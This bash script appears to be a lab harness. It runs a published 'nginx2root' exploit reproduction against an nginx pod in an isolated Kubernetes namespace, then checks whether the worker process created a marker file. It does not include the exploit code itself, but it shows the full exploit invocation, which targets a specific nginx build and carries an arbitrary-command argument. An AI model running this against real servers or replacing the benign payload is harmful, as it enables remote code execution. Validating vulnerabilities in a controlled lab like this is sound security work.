#!/usr/bin/env bash
# The real run for this example: the published reproduction, unmodified, over loopback from the client container of the bound pod.
set -uo pipefail
NS=sim-nginx2root; OUT=out/nginx2root; WORK=/tmp/nginx2root-poc; MARK="sbob-proof-$(date +%s)"
mkdir -p "$OUT"
for f in avx512f avx512vl; do
  grep -qm1 -w "$f" /proc/cpuinfo || { echo "not possible on this runner: the CPU lacks $f, which the published reproduction needs" | tee "$OUT/real-result.txt"; exit 0; }
done
kubectl -n $NS scale deployment/traffic --replicas=0
kubectl -n $NS delete pod -l app=nginx2root --wait=true
kubectl -n $NS rollout status deployment/nginx --timeout=300s
POD=$(kubectl -n $NS get pod -l app=nginx2root --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
kubectl -n $NS exec "$POD" -c client -- mkdir -p /work
kubectl -n $NS cp "$WORK/exploit" "$POD:/work/exploit" -c client
kubectl -n $NS exec "$POD" -c client -- sh -c 'cd /work && python3 -m venv exploit/.venv && exploit/.venv/bin/pip -q install -r exploit/requirements.txt && cc -O2 -Wall -Wextra -Werror exploit/streamer.c -lcrypto -o exploit/streamer && ./exploit/streamer --version' || { echo "did not run: the client could not be prepared" | tee "$OUT/real-result.txt"; kubectl -n $NS scale deployment/traffic --replicas=1; exit 0; }
date -u +%FT%TZ > out/real-from
landed=0
for try in 1 2 3; do
  echo "================= pass $try ================="
  kubectl -n $NS exec "$POD" -c client -- sh -c "cd /work && timeout 600 exploit/.venv/bin/python exploit/exploit.py --target https://127.0.0.1:443/ --profile golden-nginx-1.31.8-debian13-amd64 --cmd 'touch /tmp/$MARK-$try'" 2>&1 | tail -15 || true
  sleep 5
done
sleep 25
date -u +%FT%TZ > out/real-to
sleep 20
for try in 1 2 3; do
  if kubectl -n $NS exec "$POD" -c nginx -- stat -c '%u:%g %a %n' "/tmp/$MARK-$try" 2>/dev/null; then landed=1; fi
done
if [ "$landed" = 1 ]; then echo "landed: the worker created the marker file" | tee "$OUT/real-result.txt"; else echo "did not land in 3 passes; nothing can be concluded from this run" | tee "$OUT/real-result.txt"; echo "::warning::nginx2root real run did not land"; fi
kubectl -n $NS scale deployment/traffic --replicas=1 || true
